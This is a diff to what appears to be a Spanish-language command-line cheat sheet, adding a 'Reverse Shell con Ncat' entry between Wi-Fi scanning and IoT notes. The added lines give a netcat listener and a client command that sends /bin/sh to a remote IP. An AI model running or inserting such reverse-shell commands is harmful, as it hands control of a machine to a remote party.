@@ -595,6 +595,16 @@ Escaneo de Redes Wifi Disponibles
 
 ``` sudo iwlist wlan0 scan | egrep "Cell|ESSID|Signal|Rates"```
 
+# Reverse Shell con Ncat
+
+Desarrollador escucha en puerto 4444
+
+``` nc -lvp 4444 ```
+
+Cliente envía su Shell a la IP del desarrollador
+
+```nc **IP** 4444 -e /bin/sh```
+
 # IOT
 
 Dispositivos conectados USB por conexión serial. Ubicarlo es sencillo con:
